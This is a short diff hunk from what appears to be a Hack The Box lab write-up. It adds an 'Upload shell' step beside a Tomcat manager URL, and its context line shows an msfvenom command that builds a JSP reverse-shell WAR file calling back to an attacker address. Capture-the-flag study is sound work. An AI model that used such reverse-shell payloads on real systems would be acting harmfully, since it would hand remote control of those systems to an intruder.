@@ -44,6 +44,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revsh
 
 
 ```
+Upload shell
 http://10.10.10.95:8080/manager/html
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d42e6ba7-54c0-4c82-b94e-b89f3bb38eb8)
